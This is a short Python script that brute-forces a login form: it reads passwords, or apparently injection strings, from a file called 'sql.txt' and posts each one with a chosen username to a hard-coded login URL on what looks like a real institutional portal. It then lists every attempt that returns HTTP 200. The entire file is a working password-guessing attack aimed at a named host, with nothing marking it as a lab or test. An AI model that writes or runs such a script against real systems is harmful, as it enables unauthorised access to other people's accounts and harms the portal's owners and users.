import requests

def send_post_request(url, data):
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Request was successful!")
            return True
        else:
            print(f"Request failed with status code: {response.status_code}")
            return False

    except Exception as e:
        print(f"An error occurred: {e}")
        return False


def test_passwords(url, username, file_path):
    print(f"Testing passwords against {url}")
    print("=" * 40)
    successful_requests = []

    with open(file_path, 'r') as file:
        for line in file:
            password = line.strip()
            print(f"Testing password: {password}")
            data = {'username': username, 'password': password}
            if send_post_request(url, data):
                successful_requests.append(password)
            print("-" * 40)
    return successful_requests


if __name__ == "__main__":
    url = 'https://inner.portal.regjeringen.uiaikt.no/login'
    username = input("Please enter username you want to test: ")
    file_path = 'sql.txt'
    successful_passwords = test_passwords(url, username, file_path)

    if successful_passwords:
        print("\nSuccessful Requests:")
        for password in successful_passwords:
            print("-" * 20)
            print(password)
    else:
        print("\nNo successful requests.")
